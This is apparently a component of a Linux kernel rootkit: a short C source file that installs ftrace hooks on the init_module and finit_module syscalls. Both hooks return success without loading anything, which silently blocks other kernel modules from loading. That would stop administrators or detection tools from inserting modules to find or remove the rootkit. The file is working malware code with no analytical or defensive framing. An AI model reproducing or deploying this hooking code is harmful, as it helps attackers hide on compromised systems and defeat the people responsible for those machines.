#include "../include/core.h"
#include "../include_hooks/insmod.h"

static asmlinkage long (*orig_init_module)(struct file *file, const char *uargs, unsigned long flags);
static asmlinkage long (*orig_finit_module)(struct file *file, const char *uargs, unsigned long flags);
static asmlinkage long hook_init_module(struct file *file, const char *uargs, unsigned long flags) {
    return 0;

}

static asmlinkage long hook_finit_module(struct file *file, const char *uargs, unsigned long flags) {
    return 0;

}


static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_init_module", hook_init_module, &orig_init_module),
    HOOK("__x64_sys_finit_module", hook_finit_module, &orig_finit_module),

};

int init_hook_insmod(void) {
    int err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        return err;

    }

    return 0;

}

void exit_hook_insmod(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

}